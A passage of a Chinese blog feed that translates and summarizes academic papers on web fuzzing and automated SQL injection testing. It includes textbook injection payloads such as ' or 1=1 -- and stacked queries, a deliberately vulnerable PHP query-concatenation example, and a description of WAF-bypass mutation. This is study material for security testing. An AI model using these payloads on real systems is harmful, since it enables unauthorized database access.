title="结论"></a><strong>结论</strong></h2><p>这项工作提供了一个框架，用于模糊Web应用程序并通过监视机制检测漏洞。所开发的解决方案与现有技术中提出的解决方案不同，因为在这项工作中，监视机制嵌入在Web应用程序的后端组件中。</p><p>这种类型的监控方法有许多优点：作为执行流的最后元素，不需要对以前的实体做出假设;不依赖于任何清理，验证或编码过程;使用来自Web应用程序组件的资源以帮助检测。</p><p>当前的框架版本可以检测到多个漏洞：SQL注入，本地&#x2F;远程文件包含以及反射&#x2F;存储的跨站脚本。</p><p>此外，该框架能够将目标应用程序置于特定状态，以便在所有状态下进行测试。</p><p>此外，SQL注入检测机制在考虑Ray和Ligatti代码注入定义的情况下进行了测试。我们可以得出结论，开发机制比其他最先进的机制表现更好。</p><p>关于未来的工作，我们考虑开发剩余的漏洞检测机制：OS命令注入;服务器端语言代码注入;目录&#x2F;路径遍历;源代码披露。此外，可以通过状态识别功能来自动地分析目标应用程序并推断其执行状态，从而改进 fuzzer。</p><h2 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a><strong>个人总结</strong></h2><p><strong>本文介绍了常见的漏洞检测技巧</strong></p><p>sqli : 静态代码分析和动态执行监控(动静结合)，模型检测法<br>L&#x2F;RFL : 包含远程文件或者是可执行文件，观察远程服务器或者本地服务器的变化<br>XSS : 一种是检查请求是否有异常，另一种是键查响应是否有异常</p><p>并开发了一个自动化的框架去实现这些检测</p><h2 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接"></a><strong>原文链接</strong></h2><p><a href="https://fenix.tecnico.ulisboa.pt/downloadFile/563345090413029/ExtendedAbstract-MEICA-67039-MiguelBeatriz.pdf">Automatic Detection of Vulnerabilities in Web Applications using Fuzzing</a></p>]]></content>
    
    
    <categories>
      
      <category>翻译</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用模糊测试对抗预期输入(半机翻有删增)</title>
    <link href="/2019/02/25/%E7%94%A8%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%AF%B9%E6%8A%97%E9%A2%84%E6%9C%9F%E8%BE%93%E5%85%A5(%E5%8D%8A%E6%9C%BA%E7%BF%BB%E6%9C%89%E5%88%A0%E5%A2%9E)/"/>
    <url>/2019/02/25/%E7%94%A8%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%AF%B9%E6%8A%97%E9%A2%84%E6%9C%9F%E8%BE%93%E5%85%A5(%E5%8D%8A%E6%9C%BA%E7%BF%BB%E6%9C%89%E5%88%A0%E5%A2%9E)/</url>
    
    <content type="html"><![CDATA[<h2 id="摘要："><a href="#摘要：" class="headerlink" title="摘要："></a><strong>摘要：</strong></h2><p>模糊测试是一种高度自动化的测试技术，它使用<strong>无效数据</strong>（来自文件，网络协议，API调用和其他目标）作为应用程序输入来覆盖大量边界情况，以更好地确保不存在可利用的漏洞。模糊测试让开发人员或质量保证（QA）团队在使用功能测试等技术进行测试时测试大量边界情况成本过高。综合的负面测试案例( 那些验证产品不做它不应该做的事情，而不是它做了它应该做的事情(正测试案例)) 很难构建，因为可能的排列数量是天文数字。然而，模糊测试覆盖了大部分负面测试用例，而没有强迫测试人员针对给定的边界条件处理每个特定的测试用例。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><strong>介绍</strong></h2><p>例如，如果输入包含一个4字节有符号整数，应该在1到10之间，边界情况将包括0，-1,11,12，大负数和字节边界周围的情况（2^8,2^16,2^24,2^31）。单独编码这些情况很困难，考虑到整数是一种相对受限的输入形式（字符串具有更多的排列），这实际上是一组最好的测试用例。**边界条件很重要，因为边界条件故障的重要子集是安全故障。**因此，我们今天未测试的边界条件是我们明天必须发布的安全补丁。</p><span id="more"></span><p>fuzzer工具生成半有效数据（数据足够正确，以防止解析器立即解除它，但仍然无效导致问题），将其发送到目标应用程序进行处理，然后观察应用程序以查看它是否因为它失败消耗数据。如果是这样，该工具会保存提交的数据以供以后分析，并提交新的格式错误的数据。如果应用程序没有失败，该工具会选择是否删除格式错误的数据并继续执行下一步操作。手动执行这些步骤，我们只能执行几百次或几千次迭代。然而，通过自动化整个周期，模糊器工具可以执行数十万或数百万次这样的迭代，覆盖了大量有趣的排列，难以编写单独的测试用例。</p><p>在编写从不受信任的来源获取输入的安全应用程序时，开发人员必须<strong>针对各种边界条件测试输入解析器</strong>。模糊测试可以使这个过程变得更加容易，并为分配给测试的时间提供最佳结果，有助于发现数据解析中可能无法被忽视的问题。</p><h2 id="方法论"><a href="#方法论" class="headerlink" title="方法论"></a><strong>方法论</strong></h2><p>模糊测试涉及编写生成“半有效数据”的工具，将其提交给应用程序，并确定应用程序是否失败。出于本文的目的，我将仅考虑模糊化的自动化方法。下图显示了模糊测试工具所经历的不同高级状态。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%AF%B9%E6%8A%97%E9%A2%84%E6%9C%9F%E8%BE%93%E5%85%A51.gif" alt="此处输入图片的描述"></p><p>一个完整的模糊迭代，从一第一次迭代开始**。模糊器首先通过用于测试的两种主要方法之一来获取“半有效数据”：生成或突变。**然后，模糊器提交数据并跟踪错误输入是否导致应用程序崩溃（在这种情况下，它会保存数据以供以后分析）。如果不是，则模糊器自动进入下一次迭代。</p><p>信任边界是数据或执行从一个信任级别转移到另一个信任级别的任何位置，其中信任级别是资源的一组权限。例如，从操作系统中的用户模式转换到内核跨越信任边界，因为内核被信任对处理器做任何事情，而用户模式仅允许处理器操作的子集。类似地，网络和机器之间存在信任边界，因为网络上的任何人都可以修改网络数据，而机器上只有人可以修改机器数据。不同用户上下文之间的交叉呈现另一个信任边界。查看信任边界的另一种方法是将漏洞导致特权提升的位置。<strong>在决定应用程序中的模糊内容时，我们必须考虑信任边界;它们有助于确定要查看哪些输入的优先顺序以及执行此操作的顺序。</strong></p><p><strong>应用程序通常具有多个输入</strong>，但如果产品团队在威胁建模方面做得很好，则威胁模型将包含所有这些的详细列表。在大多数系统中，大多数输入来自文件，配置和注册表项，APls，用户界面，网络接口，数据库条目和命令行参数。<strong>因此，这些输入是模糊测试的主要目标，但系统接收输入的任何地方都是提交格式错误数据的候选者。</strong></p><p><strong>下一步是优先考虑哪些输入到模糊，这可能是一个棘手的过程</strong>。例如，我最近审查了一个带有网络接口的Windows服务，该接口从仅管理员身份验证的连接中获取数据。它还读取了一个注册表项，用户可以通过该注册表项指定哪些文件夹对搜索很重要。开发团队认为模糊网络接口很重要，因为组件是面向网络的。相反，我建议他们专注于注册表项，因为任何经过身份验证的用户都可以写入注册表项。此系统输入跨越信任边界，表示从任何用户到服务帐户的特权提升。网络接口只能由已经是管理员的用户攻击，因为它没有跨越信任边界;相反，软件中的漏洞意味着任何可以登录到计算机或远程访问注册表的人都可以写入允许他们升级到服务帐户的注册表设置。</p><p>一旦确定哪个条目指向模糊，就可以使用许多不同的技术，但模糊器首先需要一个格式错误的数据源。请注意，如果所有提交的数据都格式不正确，应用程序将在解析第一个无效数据块后丢弃输入，并且不会测试任何其他代码。因此，<strong>使用大多数有效但包括一些无效或“半有效数据”至关重要</strong>。<strong>获取此数据有两种主要方式：数据生成和数据突变。</strong></p><p>**模糊器可以根据其外观规格生成数据。**数据描述可以像“it’s an int.”一样简单。实际描述将取决于您的应用程序所使用的语言，但它不应该对您的特定应用程序不明确。 （我将忽略特殊的复杂情况，例如网络应用程序，可能需要根据整数是从网络还是本地机器写入或读取整数重新排序;在大多数情况下，整数是最简单的情况。）或者，描述可能与XML文档一样复杂，它描述了任意复杂的嵌套二进制数据结构的各个偏移量和数据结构。当然，这会使实现模糊器变得更加困难，因为我们首先必须了解格式的细节，然后创建XML模式以准确描述格式，最后编写模糊器来解析XML模式和XML文档以生成“半有效数据</p><p><strong>获取格式错误数据的第二种方法是从一组已知的良好数据开始，并在特定位置进行变更。</strong> HTML是复杂文件格式的一个很好的例子，很难创建一个可以覆盖整个规范的生成器。模糊器不是从HTML格式规范生成代码，而是可以使用有效的示例或模板文件，在几个关键区域中复制和修改它，并将其提交到目标应用程序 -  Web服务器或浏览器。创建新的测试用例就像从现有文件的可用源（在本例中为Internet）中收集模板文件一样简单</p><p><strong>当模糊器或运行它的人可以轻松获得良好的数据源</strong>，用于配置和注册表设置，用户界面，命令行界面和数据库界面时<strong>变异通常是更简单的方法</strong>。<strong>在其他情况下，获取输入的良好副本可能比简单地从头开始生成（例如使用APls）更困难</strong>。格式也可能对格式错误的数据高度敏感。例如，网络协议通常是严格定义的，因此过多的变化，特别是在关键控制字段中，可以在代码路径的早期终止解析，可能在应用程序看到它之前在网络堆栈中。在这种情况下，突变最终会做更多的工作，因为解析好的数据以确定可以改变模糊的内容是很困难的。</p><h2 id="智能模糊器-VS-非智能模糊器"><a href="#智能模糊器-VS-非智能模糊器" class="headerlink" title="智能模糊器 VS 非智能模糊器"></a><strong>智能模糊器 VS 非智能模糊器</strong></h2><p><strong>在编写模糊器时，您经常会发现模式可以为成本带来最大的好处</strong>。基于模式的模糊测试的结果根据数据格式的复杂性以及诸如校验和或众多相对参考字段的结构和技术的使用而变化。尽管如此，基于模式的模糊器通常比智能模糊器花费更少，同时提供类似口径的结果。</p><p><strong>基于模式的模糊器查找特定的数据模式，然后在找到它们时执行一些数据修改</strong>。例如，对应于二进制代码块中可打印字符范围（0×20-0×7F）中的ASCII数据的n个连续字节值的模式可以指示字符串。类似地，在ASCII范围内的值和零之间交替的字节值可能表示unicode数据。在识别出这种模式之后，模糊器可以采取一些有趣的操作，<strong>例如将额外的有效字符串数据插入块中以试图找到缓冲区溢出</strong>。正如我所提到的，从标识的字符串中删除尾随的空终止字符是另一种有用的模糊测试技术，因为解析器有时会期望这个字符并在它不存在时失败。字符串数据结构通常还会在字符串前面加上长度，这意味着修改字符串前面的值可能会暴露出有趣的错误。例如，缓冲区溢出可能会发生，因为解析器依赖于前置长度来分配缓冲区，而空终止符可以复制数据。</p><p>文本格式提供与字符串数据类似的目标。不同之处在于，基于文本格式的所有数据在某些时候都是字符串数据。对字符串数据进行标记并基于标记对其进行操作可以因此产生一些有趣的结果。例如，更改顺序，插入重复项以及修改标记可能会导致解析器失败。**此外，解析器识别分隔符并使用它们将数据分成令牌。在这些标记的中间或它们之间插入分隔符也可以很好地进行模糊测试。**对于基于文本的格式，使用空字符，空格，CRLF，CR，LF和编码序列可能会暴露解析器关于这些应该在何处的可能不准确的假设。</p><p>整数是二进制数据的一个很好的目标，它通常很大程度上依赖于它们来指定任意结构的大小和数量。**简单地用特殊值替换整数值通常会导致解析器以奇怪和奇妙的方式崩溃。**将所有Os（0×00,0×0000 0×00000000等）或全1（0×FF，0×FFFF，0×FFFFFFFF等）插入二进制块可以有效识别整数溢出整数用于在解析期间分配内存或索引缓冲区。在当前值中添加或减去一些小值也可以定位问题，因为二进制结构通常由某种类型标识，可能是具有特定小范围的枚举。例如，Microsoft SQL Server的表格数据流（TDS）网络协议使用偏移量为4的字节，该字节必须在0-5范围内，以表示TDS数据包类型。对这个数字的一个小的改变导致了一个不同的解析代码路径，它可能期望一个类似但不同的格式，而一个大的改变可能会通过范围检查抛出这种情况。翻转整数值的最高位使其为负（按0或0×80,0×8000等按位）有助于识别有符号&#x2F;无符号不匹配错误。最后，通过交换数据流中的不同块来移动数据也可以发现错误。</p><h2 id="FUZZ-中的一般问题"><a href="#FUZZ-中的一般问题" class="headerlink" title="FUZZ 中的一般问题"></a><strong>FUZZ 中的一般问题</strong></h2><p>构建模糊器时，必须考虑几个常见问题。有些你可以通过仔细检查你模糊的格式来预测，但是在你开始开发模糊器后你会发现其他的。通过易于理解的格式，您可以确定是否必须处理以下任何验证问题，这可能会妨碍模糊器的有效性。</p><p>**许多格式和协议执行各种类型的验证。**例如，网络协议和文件格式通常使用散列和校验和来帮助验证数据包和文件内容的完整性。当然，这些机制为模糊测试提供了障碍，因为我们需要能够为测试目的更改内容。<strong>解决方案是在模糊器中提供额外的逻辑，以便在内容突变或生成后重新计算正确的哈希值。</strong></p><p>**加密的哈希和数字签名甚至更成问题，**因为它们的设计目的不仅是验证数据内容自源发送以来没有改变，而且源还具有一些已知的身份。在这些情况下，模糊器还需要知道数字签名算法和用于签名的私钥，以便它可以假装它是源方。</p><p>对于数字签名或加密数据，仅当加密或签名数据跨越信任边界时，输入才代表重大威胁。例如，加密（并因此签名）的电子邮件对模糊很重要，因为即使发件人使用公钥进行身份验证，阅读电子邮件的用户也可能不会认为发件人可信。加密和签名数据跨越发送者和接收者之间的信任边界，其信任级别不一定相同。</p><p>另一方面，补丁是通常不跨越信任边界的数据的示例。如果软件应用程序在补丁上验证软件公司的数字签名，则考虑恶意输入可能并不重要，因为公司始终可以提供良好的数据。当然，如果威胁是软件公司的流氓员工可能产生恶意补丁，那么模糊测试将再次变得重要。这个题外话说明了威胁建模的价值：一旦你理解了需要防范的威胁，通过对输入进行模糊测试就可以更轻松地缓解它们。</p><p><strong>通常，加密格式不适合模糊测试</strong>。如果模糊器执行除随机位翻转之外的任何操作，则其模式识别器或解析器将无法解析数据。这里的关键是确保模糊器在变异和重新加密之前具有解密数据的附加功能;在生成数据时，它需要能够在提交到应用程序之前进行加密。使用压缩的格式存在几乎相同的问题，解决方案是相同的：在模糊器中提供解压缩和压缩功能。</p><p>当然，这不是一个在开发模糊器时可能遇到的问题的综合列表。一旦有了工作工具，就可以通过代码覆盖率分析识别其他问题。通过在监视代码覆盖率的同时对应用程序运行模糊器，您可以快速确定是否在代码中的同一位置拒绝了所有周期。通过分析代码的特定部分，您可以确定如何让模糊器继续超过该点（至少在某些时候）</p><h2 id="应用行为"><a href="#应用行为" class="headerlink" title="应用行为"></a><strong>应用行为</strong></h2><p>将模糊数据提交到目标应用程序时实际发生的情况在很大程度上取决于您的模糊测试。如果您正在测试网络堆栈，则数据会通过网络传输到应用程序，但是一旦数据到达，就很难判断数据是否具有所需的效果。确定应用程序何时失败比证明成功何时更容易。</p><p><strong>在模糊测试中，最好先寻找真正错误的东西</strong>。例如，Windows操作系统使用异常处理将故障情况通知给应用程序和操作系统的其他部分。调试器可以看到这些异常，因此将其构建到模糊器中可以确定应用程序何时崩溃</p><p>**在模糊测试期间检查应用程序正确性的其他方法包括查找程序内存使用量或CPU利用率的峰值，这可能表明应用程序正在使用格式错误的输入来计算内存分配。**如果程序对输入值执行算术运算，它还可以指示整数溢出条件。这可能会导致可利用的缓冲区溢出情况。类似地，CPU峰值通常意味着程序正在使用一个没有正确限制的密集算法 - 可能就像一个循环一样简单，在该循环中，用于确定要执行多少循环的变量来自恶意输入。至少，这表明拒绝服务，如果不是更危险的事情。</p><p>从这些简单的故障模型中，我们可以设想更复杂和完整的故障和成功模型，这些模型实际检查系统以确保在解析格式错误的数据后它正常工作。我建议在模糊器中使用可扩展模式来实现对解析格式错误数据的应用程序成功或失败的检查。这是真的，因为成功和失败的构成将在模糊器的生命周期中发生变化。在创建软件时，开发人员必须认真考虑如何覆盖所有边界条件，特别关注那些可能导致安全漏洞的情况。我在这里提出的想法应该提供一些关于如何建立模糊器以及从模糊测试过程中得到什么的理解。</p><h2 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a><strong>个人总结</strong></h2><p>看了一下这篇文章主要讲述的是比较基础的 模糊测试的流程和方法,即通过生成和突变获取到半有效数据(<strong>数据足够正确，以防止解析器立即丢弃它，但仍然无效导致问题</strong>)，然后输入系统进行测试，根据返回的结果是否出错判断是否需要保存测试结果或者进行下一次迭代。</p><p>还讲到了什么地方需要我们进行重点的关注和测试，比如涉及系统边界条件，边界条件的漏洞很有可能导致特权提升的问题，所以在很多情况下我们要有限检测这些位置</p><p>数据生成：根据外观生成数据<br>数据突变：在正确数据基础上进行修改和替换</p><p>讲到了模糊测试中遇到的困难，比如加密和签名校验等</p><p>最后是如何判断测试结果，比如观察返回数据，观察计算机 CPU 的占用率(其实就是观察不同输入对计算结果产生的差异)</p><h2 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接"></a><strong>原文链接</strong></h2><p><a href="https://ieeexplore.ieee.org/document/1423963">Violating assumptions with fuzzing</a></p>]]></content>
    
    
    <categories>
      
      <category>翻译</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入漏洞的自动化测试：输入数据变异法(半机翻有删增)</title>
    <link href="/2019/02/24/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%EF%BC%9A%E8%BE%93%E5%85%A5%E6%95%B0%E6%8D%AE%E5%8F%98%E5%BC%82%E6%96%B9%E6%B3%95(%E5%8D%8A%E6%9C%BA%E7%BF%BB%E6%9C%89%E5%88%A0%E5%A2%9E)/"/>
    <url>/2019/02/24/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%EF%BC%9A%E8%BE%93%E5%85%A5%E6%95%B0%E6%8D%AE%E5%8F%98%E5%BC%82%E6%96%B9%E6%B3%95(%E5%8D%8A%E6%9C%BA%E7%BF%BB%E6%9C%89%E5%88%A0%E5%A2%9E)/</url>
    
    <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a><strong>摘要</strong></h2><p>Web服务越来越多地应用于各种领域，从nance和e-government到社交媒体。由于它们是基于Web技术构建的，因此它们也遭受了前所未有的攻击和渗透。在这些攻击中，那些针对SQL注入漏洞的攻击在过去几年一直排名第一。在上线Web服务之前进行测试以检测此类漏洞至关重要。我们在本文中提出了一种自动化测试方法，即μ4SQLi，以及它的基础变异算子集。μ4SQLi可以产生有效的输入，从而导致可执行和有害的SQL语句。可执行性是关键，否则不能利用注入漏洞。我们的评估表明，该方法对于检测SQL注入漏洞并产生绕过现实世界中常见配置的应用程序防火墙是有效的。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><strong>介绍</strong></h2><p>在本文中，我们提出了一种针对SQLi漏洞的黑盒自动化测试方法，称为 μ4SQLi。<br>从一般的初始测试用例开始，我们的方法应用了一组特定设计的变异算子，以增加产生成功SQLi攻击的可能性</p><span id="more"></span><p>更具体的说，这种新的攻击模式是通过在同一输入上应用多个变异算子来生成。此外，我们的一些变异算子旨在模糊注入的SQL代码片段以绕过安全过滤器，例如Web应用程序防火墙（WAF），而其他则旨在修复可能由先前突变引起的SQL语法错误。因此，我们的方法可以生成测试输入，这些输入可以生成语法正确且可执行的SQL语句，这些语句可以揭示SQL漏洞（如果存在）。通过产生绕过防火墙并导致可执行SQL语句的SQLi攻击，我们确保找到可利用的漏洞而不是无法利用的漏洞，例如因为过滤器阻止了所有攻击。此外，我们的方法产生的具体样本攻击可以帮助开发人员x源代码或安全过滤器的配置。我们的方法是完全自动化的，并且由名为 Xavier3的工具提供支持。</p><p>我们已经在一些暴露Web服务接口的开源系统上评估了我们的方法。与称为Std的基线方法相比，该方法由最新的137种已知SQLi攻击模式组成，我们的方法更快，并且显着更有可能在有限的时间预算内检测漏洞。此外，当主题系统受到WAF保护时，Std产生的泄露漏洞的任何输入都不能通过防火墙，而我们的方法仍然可以产生大量输入，通过防火墙并显示全部已知的漏洞。</p><p>本文的其余部分安排如下：第2部分提供了有关SQLi漏洞和审查相关工作的背景知识。第3节介绍了我们提出的变异算子和安全测试方法和工具。第4节介绍了评估以及对结果和有效性威胁的讨论。最后，第5节总结了这项工作。</p><h2 id="背景和相关工作"><a href="#背景和相关工作" class="headerlink" title="背景和相关工作"></a><strong>背景和相关工作</strong></h2><p>本节提供有关Web服务和SQLi漏洞的简要背景，并回顾以前有关SQLi测试的工作。</p><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a><strong>背景</strong></h3><p>在使用数据库的系统（例如基于Web的系统）中，用于访问后端数据库的SQL语句通常由本机应用程序代码视为字符串。这些字符串是通过根据用户选择或应用程序的控制来连接不同的字符串片段而形成的流。一旦形成SQL语句，就会使用特殊函数将SQL语句发送到要执行的数据库服务器。例如，SQL语句形成如下（在案例研究中，我们的一个Web服务的简化示例）：</p><pre><code class="hljs">$sql = &quot;Select * From hotelList where country =&#39;&quot;;$sql = $sql . $country;$sql = $sql . &#39;&quot;&#39;;$result = mysql_query($sql) or die(mysql_error());</code></pre><p>变量<code>$country</code>是用户提供的输入，它与SQL语句的其余部分拼接，然后存储在字符串变量<code>$sql</code>中。字符串然后传递给函数 mysql_query 查询，该查询将SQL语句发送到要执行的数据库服务器。</p><p>SQLi是一种攻击技术，攻击者将恶意SQL代码片段注入这些输入参数。当输入参数直接在SQL语句中使用而没有经过适当的验证或消毒时，这种攻击是可能的。攻击者可能以改变生成的SQL语句行为的方式构造输入值，使攻击者能够对数据库执行操作，而不是应用程序开发人员所希望的操作。这些操作可能导致敏感数据暴露，未经授权插入或更改数据，丢失数据，甚至控制数据库服务器。</p><p>在前面的示例中，如果输入<code>$country</code>的值为 ‘ or 1 &#x3D; 1 – 生成的SQL语句将是：</p><pre><code class="hljs">Select * From hotelList where country=&#39;&#39; or 1 = 1 --&#39;</code></pre><p>第一个引号闭合原语句中的引号，最后的双短划线注释掉原语句最后的一个引号，使得结果SQL语句在语法上有效。子句 or 1 &#x3D; 1 是重言式，即条件将始终为真，绕过where子句中的原始条件并返回表中的所有行。<br>为避免此类攻击，应用程序开发人员使用过滤器来防止恶意输入影响应用程序的行为。开发人员必须小心，不要阻止可能类似于恶意输入的有效输入。例如，使用拒绝单引号输入的过滤器可以防止前一个示例中的攻击。但是，过滤器也会拒绝单引号参与的有效输入（例如，O’Brian）</p><p>Web服务是面向服务的体系结构的基本模块，它提供了在Web上轻松访问和交换信息的工具。每个Web服务都提供一组可由客户端调用的操作。操作类似于传统编程语言中的方法，它具有一组输入参数并返回结构化输出。 Web服务的接口和功能通常由公共可用的Web服务描述语言（WSDL）文件描述。</p><p>在本文中，我们考虑被测服务的输入参数的SQLi漏洞：如果输入参数在服务实现的任何SQL语句中使用，并且通过此参数，攻击者可以发送，则输入参数容易受到SQLi攻击恶意输入，可以更改SQL语句的预期逻辑。要利用此类漏洞，攻击者必须提供导致可执行SQL语句的输入。否则，结果语句将被数据库拒绝，因此无法访问或更改数据。</p><h3 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a><strong>相关工作</strong></h3><p>之前关于SQLi检测的研究使用了白盒和黑盒方法来检测漏洞。几种白盒方法使用污点分析来识别无效输入<br>进入SQL语句。 Fu和Qian 建议使用符号执行来识别需要满足的约束以导致SQLi攻击。 Shar等人。 使用源代码的数据挖掘来预测漏洞。除了要求访问源代码之外，正如我们之前提到的那样，并非总是可能的，这些方法中的大多数在其算法的某些方面依赖于一组已知的漏洞模式。</p><p>在生成测试用例时，现有的黑盒方法也依赖于已知的注入模式。Ciampa等提出了一种方法，分析合法和恶意测试用例的输出，包括错误消息，以了解有关后端数据库的类型和结构的更多信息。然后，此信息用于制作更有可能成功揭示漏洞的攻击输入。 Antunes等还分析了使用恶意和合法输入来检测漏洞时应用程序行为的差异。黄等人使用了一种使用已知攻击模式的测试生成方法。</p><p>各种学术和在线安全源已经列举和讨论了已知的 SQLi 模式。但是，依赖这些模式可能不足以测试应用程序，因为攻击者总是找到利用漏洞的新技术。此外，对于相同的模式，可能存在大量不同的表示，例如，使用不同的编码</p><p>一些方法提出了<strong>运行时预防技术</strong>而不是测试技术。在大多数这些方法中，静态分析用于收集程序可以生成的所有可能形式的SQL语句。在运行时，如果SQL语句的结构与这些收集的表单中的任何一个都不匹配，则该语句为被视为潜在的攻击。 Sekar结合了污点分析和策略来检测运行时的注入攻击。运行时预防方法是测试方法的补充，也可以用作测试的有效预言。</p><p>在我们之前的论文中，我们发现使用运行时预防技术为 oracle 提高了 SQLi 测试的检测率。我们还确定了对更复杂的 oracle 的需求，该 oracle 可以推断已发现漏洞的可利用性。在本文中，我们尝试通过增强 oracle 来评估形成的攻击的可执行性来解决这个问题。恶意输入可以成功地规避所有安全机制，但由此产生的攻击可能会产生不可执行的SQL语句，因此不会提供漏洞可利用的证据。</p><p>已经提出并广泛研究了变异测试作为评估测试套件充分性的方法，其中测试程序被变异以模拟故障。 Shahriar和Zulkernine 定义了SQLi特定的变异算子来评估测试套件在解决SQLi漏洞方面的有效性。 Fonseca等人也使用突变分析比较商业安全测试工具的有效性。我们在本文中提出的变异算子会改变测试输入，以增加触发漏洞的可能性，而不是测试中的程序，以评估测试套件在发现故障时的有效性。</p><p>霍勒等人提出了一种名为 LangFuzz 的方法，通过改变输入代码来测试解释器的安全漏洞，例如内存安全问题。该方法已成功应用于发现 Mozilla JavaScript和PHP解释器中的缺陷。但是，我们的方法在各方面都有所不同：</p><p>(1)我们针对需要不同变异算子和测试生成技术的SQL注入漏洞; (2)在SQL漏洞的情况下，失败的可观察性比寻找崩溃更具挑战性;</p><p>我们需要拦截SUT与其数据库之间的通信，以分析SQL语句的可执行性和漏洞检测。</p><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a><strong>方法</strong></h2><p>我们提出了一种自动化技术，即 μ4SQLi，用于检测SQLi漏洞。我们的技术依赖于一组变异操作符，这些操作符操纵输入（合法的）以创建新的测试输入以触发SQLi攻击。</p><p>此外，这些运算符可以以不同的方式组合，并且多个运算符可以应用于相同的输入。这使得生成包含新攻击模式的输入成为可能，从而增加了检测漏洞的可能性。</p><p>具体而言，我们希望生成可绕过Web应用程序防火墙并生成可执行SQL语句的测试输入。WAF可能会阻止SQLi攻击并阻止易受攻击的Web服务被利用。因此，有效的测试输入需要通过WAF才能到达服务。此外，它们应该导致可执行的SQL语句，否则不太可能出现安全问题，因为数据库引擎会拒绝它们，因此不会泄漏或泄露任何数据。</p><p>本节介绍我们提出的用于生成测试数据的变异算子。对于每个变异算子及其定义，提供了一个具体的例子。在一些运算符中，我们还讨论了它们关于输入和先前应用的运算符的前提条件。然后，我们将讨论我们的测试生成技术和我们开发的支持该技术的自动化工具。</p><h3 id="变异算子"><a href="#变异算子" class="headerlink" title="变异算子"></a><strong>变异算子</strong></h3><p>变异操作符（MO）可以按其用途分为以下三类：行为改变，语法修复和混淆。表1提供了所有变异算子的摘要。</p><p><strong>表一：变异运算符摘要分为行为改变，语法修复和混淆运算符。</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%BE%93%E5%85%A5%E5%8F%98%E5%BC%82%E6%96%B9%E6%B3%951.png" alt="此处输入图片的描述"></p><h4 id="行为改变"><a href="#行为改变" class="headerlink" title="行为改变"></a><strong>行为改变</strong></h4><ul><li>向输入添加OR子句</li><li>在输入中添加AND子句</li><li>添加分号后跟另外的SQL语句</li></ul><p>这类变异操作符会改变输入，目的是在应用程序易受SQLi攻击时更改应用程序的预期行为。例如，突变输入可能导致应用程序返回比预期更多的数据库行，从而将敏感数据暴露给未经授权的用户。我们定义了以下改变行为的运算符：</p><h5 id="运算符：MO-or"><a href="#运算符：MO-or" class="headerlink" title="运算符：MO_or"></a><strong>运算符：MO_or</strong></h5><p> 将 OR x &#x3D; x 添加到SQL语句的WHERE子句中，其中x是随机数或用单引号或双引号括起来的字符。</p><p><strong>示例：</strong></p><p>来自原始输入：1; MO_or 产生突变输入：1 OR 1 &#x3D; 1。因此，如果接受输入的SQL语句预先定义为</p><pre><code class="hljs">&quot;SELECT * FROM table WHERE id = &quot;+ input</code></pre><p>则输入将更改语句的逻辑并将其转换如下：</p><pre><code class="hljs">SELECT * FROM table WHERE id = 1 OR 1 = 1</code></pre><h5 id="运算符：MO-and"><a href="#运算符：MO-and" class="headerlink" title="运算符：MO_and"></a><strong>运算符：MO_and</strong></h5><p> 将 AND x &#x3D; y 添加到SQL语句的WHERE子句中，其中x和y是随机数或用单引号或双引号括起来的单个字符，x不等于y。</p><p><strong>示例：</strong></p><p>原始输入：1，突变输入：1 AND 1 &#x3D; 2。<br>例如，这将转变为预定语句：</p><pre><code class="hljs">&quot;SELECT * FROM table WHERE id =&quot;+ input </code></pre><p>变成：</p><pre><code class="hljs">SELECT * FROM table WHERE id = 1 AND 1 = 2</code></pre><p>因此，否定原始语句的逻辑。</p><h5 id="运算符：MO-semi"><a href="#运算符：MO-semi" class="headerlink" title="运算符：MO_semi"></a><strong>运算符：MO_semi</strong></h5><p>在输入中添加分号（;）后跟另外的SQL语句。生成的查询的格式为sql stmt1; sql stmt2，其中sql stmt1是原始SQL语句，sql stmt2是从预定列表中随机选择的SQL语句。</p><p><strong>示例：</strong></p><p>原始输入：1，变异输入：1; SELECT waitfor(5) FROM dual</p><p>这改变了预定语句：</p><pre><code class="hljs">&quot;SELECT * FROM users WHERE id = &quot;+ input </code></pre><p>变成：</p><pre><code class="hljs">SELECT * FROM users WHERE id = 1; SELECT waitfor(5) FROM dual</code></pre><h4 id="语法修复"><a href="#语法修复" class="headerlink" title="语法修复"></a><strong>语法修复</strong></h4><ul><li>将括号附加到有效输入</li><li>向输入添加注释命令（ - 或＃）</li><li>为输入添加单引号或双引号</li></ul><p>如前所述，SQLi攻击旨在通过注入恶意输入来更改应用程序的行为。因此，恶意输入本身应包含SQL语句片段。与常规有效输入不同，这种类型的输入在与其目标（即预定义的SQL语句）组合时可能导致SQL语法错误。</p><p>由于我们提出的方法是一种黑盒技术，因此测试生成器不知道预定义的SQL语句语法，因此生成不会导致语法错误的输入很困难。这类变异操作符会改变输入，目的是在遇到SQL语法错误时尝试修复它们。我们在这个类中定义的变异运算符如下：</p><h5 id="运算符：MO-par"><a href="#运算符：MO-par" class="headerlink" 